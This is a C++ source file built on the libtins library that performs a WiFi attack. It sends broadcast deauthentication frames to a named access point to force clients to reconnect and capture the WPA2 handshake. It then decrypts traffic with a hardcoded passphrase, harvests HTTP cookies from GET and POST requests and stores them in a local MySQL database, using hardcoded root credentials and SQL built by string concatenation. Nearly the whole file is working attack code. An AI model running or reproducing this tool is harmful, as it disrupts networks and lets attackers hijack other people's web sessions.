#include <iostream>
#include <tins/tins.h>
#include <thread>
#include <algorithm>
#include <mutex>

#include "sniffclass.h"
#include "sqlmagition.h"
#include "printdata.h"
#include "regexmagition.h"

using namespace std;
using namespace Tins;

void usage()
{
    cout<<"Usage : ./Program <Monitor Mode Dev> "<<endl;
}
bool checkArgc(int argc)
{
    if(argc!=2)
    {
        usage();
        return false;
    }
    return true;
}
bool parseCookies(PDU& pdu);
int main(int argc, char* argv[])
{
    if(!checkArgc(argc))
        exit(0);

    char* monitorDev=argv[1];

    //Declaration AP Sniffer
    APSniffer apSniffer(monitorDev);
    //Run AP Sniffer
    thread apParser(&APSniffer::run,&apSniffer);

    //Declaration DeauthSender to send deauth packet(To decrypt WPA2 must be have EAPOL Info)
    DeauthSender deauthSender(monitorDev);

    Dot11::address_type broadcast="ff:ff:ff:ff:ff:ff";

    //Declaration WPA2Sniffer
    Wpa2Sniffer wpa2Sniffer(monitorDev,parseCookies);
    //need to modify
    wpa2Sniffer.setPasswd("0000005801");
    wpa2Sniffer.setSsid("olleh_WiFi_86BF");

    //CookieParser(Wpa2Decrytor run in Backgrorund) run
    thread cookieParser(&Wpa2Sniffer::run,&wpa2Sniffer);
    sleep(2);
    //send Deauth Packet
    Dot11::address_type apBSSID=apSniffer.findBSSID(wpa2Sniffer.getSsid());
    if(apBSSID!=nullptr)
        deauthSender.sendDeauth(apBSSID,broadcast,2);
    else
        cout<<"AP Not Found !, Can't send Deauth Packet"<<endl;


    apParser.join();
    cookieParser.join();
    cout<<"Nomal Exit"<<endl;
    return 0;
}


bool parseCookies(PDU& pdu)
{

    //Database Setting up
    static SqlMagition sqlMagition("tcp://localhost:3306","root","toor","IamU");
    static RegexMagition regexMagition;

    const TCP& tcp = pdu.rfind_pdu<TCP>();

    //parse Http Packet
    if(tcp.sport()!=80&&tcp.dport()!=80) return true;

    const RawPDU& rawPDU = pdu.rfind_pdu<RawPDU>();

    if(rawPDU.payload_size()>=4)
    {

        //parsing http get or post
        if((strncmp((char*)rawPDU.payload().data(),"GET ",4)!=0&&(strncmp((char*)rawPDU.payload().data(),"POST ",5))!=0)) return true;

        bool flag=false;

        string cookie=regexMagition.findCookie((char*)rawPDU.payload().data(),rawPDU.payload_size(),flag);
        if(flag) //if find cookie
        {
            //find host
            string host=regexMagition.findHost((char*)rawPDU.payload().data(),rawPDU.payload_size(),flag);
            if(flag==true&&host.find("ahnlab")==string::npos) //skip ahnlab cookies
            {
                std::replace(cookie.begin(),cookie.end(),'\"','\'');
                sqlMagition.insertSql("Cookie",'\"'+host+"\", \""+cookie+"\", \"\"");
            }

        }
    }

    return true;
}

